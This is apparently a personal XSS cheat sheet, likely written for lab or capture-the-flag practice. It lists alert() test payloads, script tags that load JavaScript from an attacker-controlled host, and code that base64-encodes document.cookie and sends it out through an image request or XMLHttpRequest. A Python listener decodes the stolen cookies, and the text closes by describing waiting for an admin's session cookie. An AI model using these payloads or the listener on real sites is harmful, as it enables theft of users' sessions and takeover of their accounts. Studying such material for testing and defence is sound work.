# XSS

<u>**Quick scripts to try:**</u>

```javascript
<script type="text/javascript">alert('TEST');</script>

<script type="text/javascript">alert(9999);</script>

<script type="text/javascript">alert('TEST');</script>

<script type="text/javascript">alert(9999);</script>
```



<u>**Stealing cookies:**</u>

```javascript
<script src=http://$my-ip/steal.js></script>

#then make the following script and save it in steal.js
image = new Image();
image.src = 'http://$my-ip/?c=' + encodeURIComponent(btoa(document.cookie));

#OR create a cookie.js
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.5/?test='+document.cookie, true);
request.send()

#trigger with cookie.js
<img src="10.10.14.5/test.jpg" /> <script src="http://10.10.14.5/test.js"></script>
```

Use steal.js with Python3 HTTP server to receive and decode requests saved in cookie.py:

```python
import base64
import http.server
import urllib.parse
import socketserver
class MyHandler(http.server.SimpleHTTPRequestHandler):
def do_GET(self):
    URL = urllib.parse.urlparse(self.path)
    for k,v_b64 in urllib.parse.parse_qs(URL.query).items():
      try:
        v = base64.b64decode(v_b64[0]).decode().strip()
        print(f'{self.client_address[0]} DECODED COOKIE: {v}')
      except:
        v = v_b64[0].strip()
        print(f'{self.client_address[0]} RAW COOKIE: {v}')
    super().do_GET()
with socketserver.TCPServer(("0.0.0.0", 80), MyHandler) as httpd:
	httpd.serve_forever()
```

Then run the server as follows and wait for the admin to browse to the page:

```bash
sudo python3 cookie.py
```

And after waiting for a bit, the admin cookie is given!